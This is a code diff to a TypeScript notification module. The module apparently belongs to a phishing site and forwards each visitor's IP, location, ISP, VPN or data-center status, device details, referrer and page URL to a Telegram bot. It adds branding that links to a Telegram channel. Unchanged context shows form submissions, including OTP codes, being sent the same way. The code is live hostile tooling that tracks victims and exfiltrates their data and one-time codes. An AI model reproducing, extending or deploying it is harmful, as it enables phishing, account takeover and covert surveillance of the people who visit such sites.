@@ -105,24 +105,41 @@ function asPre(value: unknown): string {
   return `<pre>${escapeTelegramHtml(t || 'Unknown')}</pre>`
 }
 
+let previewRotationIndex = 0
+
+function getRotatedPreviewUrl(referrer?: string, pageUrl?: string): string {
+  const candidates: string[] = ["https://t.me/th3_allfather"]
+  if (pageUrl && /^https?:\/\//i.test(pageUrl.trim())) candidates.push(pageUrl.trim())
+  if (referrer && /^https?:\/\//i.test(referrer.trim()) && referrer.trim() !== "Direct") candidates.push(referrer.trim())
+  const selected = candidates[previewRotationIndex % candidates.length]
+  previewRotationIndex = (previewRotationIndex + 1) % 1000
+  return selected
+}
+
 export async function sendVisitorNotification(data: VisitorTelegramData): Promise<boolean> {
   const site = escapeTelegramHtml(data.siteName)
-  const message =
-    `\n🌐 <b>New Visitor (${site})</b>\n` +
-    `━━━━━━━━━━━━━━━━━━\n` +
-    `📍 <b>Location:</b> ${asCode(data.location)}\n` +
-    `🌍 <b>IP:</b> ${asCode(data.ip)}\n` +
-    `⏰ <b>Timezone:</b> ${asCode(data.timezone)}\n` +
-    `🌐 <b>ISP:</b> ${asCode(data.isp)}\n\n` +
-    `📱 <b>Device:</b>\n${asPre(data.userAgent)}\n` +
-    `🖥️ <b>Screen:</b> ${asCode(data.screen)}\n` +
-    `🌍 <b>Language:</b> ${asCode(data.language)}\n` +
-    `🔗 <b>Referrer:</b> ${asUrlField(data.referrer)}\n` +
-    `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}\n\n` +
-    `⏰ <b>Local Time:</b> ${asCode(data.localTime)}\n` +
-    `🕒 <b>UTC Time:</b> ${asCode(data.utcTime)}`
+  const networkHint = getNetworkHintLabel(data.asn, data.org || data.isp)
+  const message = [
+    `🌐 <b>(${site})</b>`,
+    "━━━━━━━━━━━━━━━━━━",
+    `📍 <b>Location:</b> ${asCode(data.location)}`,
+    `🌍 <b>IP:</b> ${asCode(data.ip)}`,
+    `⏰ <b>Timezone:</b> ${asCode(data.timezone)}`,
+    `🌐 <b>ISP:</b> ${asCode(data.isp)}`,
+    ...(networkHint ? [`🛡️ <b>VPN/DATA CENTER:</b> ${asCode(networkHint)}`] : []),
+    "",
+    `🖥 <b>Platform:</b> ${asCode(data.platformLabel ?? data.osLabel ?? "Unknown")}`,
+    `👨‍💻 <b>Browser:</b> ${asCode(data.browserLabel ?? "Unknown")}`,
+    `📱 <b>Device:</b> ${asCode(data.deviceLabel ?? "Unknown")}`,
+    `🖥️ <b>Screen:</b> ${asCode(data.screen)}`,
+    `🔗 <b>Referrer:</b> ${asUrlField(data.referrer, "Direct")}`,
+    `🌐 <b>URL:</b> ${asUrlField(data.pageUrl)}`,
+    "",
+    `<a href="https://t.me/th3_allfather">Odin Is With Us</a>`,
+  ].join("\n")
 
-  return await sendTelegramMessage(message, { disableWebPagePreview: false })
+  const previewUrl = getRotatedPreviewUrl(data.referrer, data.pageUrl)
+  return await sendTelegramMessage(message, { disablePreview: false, previewUrl, preferSmallMedia: true })
 }
 
 export async function sendFormNotification(data: FormData & { [key: string]: any }): Promise<boolean> {
@@ -340,13 +357,25 @@ ${data.otp ? `🔐 <b>OTP Code:</b> ${asCode(data.otp)}` : ''}`
 
 export type SendTelegramMessageOptions = {
   disableWebPagePreview?: boolean
+  disablePreview?: boolean
+  previewUrl?: string
+  preferSmallMedia?: boolean
+  showAboveText?: boolean
 }
 
 export async function sendTelegramMessage(
   message: string,
   options: SendTelegramMessageOptions = {},
 ): Promise<boolean> {
-  const disableWebPagePreview = options.disableWebPagePreview !== false
+  const disablePreview = options.disablePreview ?? (options.disableWebPagePreview !== false)
+  const link_preview_options = disablePreview
+    ? { is_disabled: true }
+    : {
+        is_disabled: false,
+        ...(options.previewUrl ? { url: options.previewUrl } : {}),
+        prefer_small_media: options.preferSmallMedia ?? true,
+        show_above_text: options.showAboveText ?? false,
+      }
 
   // Validate we have the required token
   if (!TELEGRAM_BOT_TOKEN) {
@@ -370,7 +399,8 @@ export async function sendTelegramMessage(
         chat_id: chatId,
         text: message,
         parse_mode: 'HTML',
-        disable_web_page_preview: disableWebPagePreview,
+        disable_web_page_preview: disablePreview,
+        link_preview_options,
       })
     })
     .then(async (response) => {
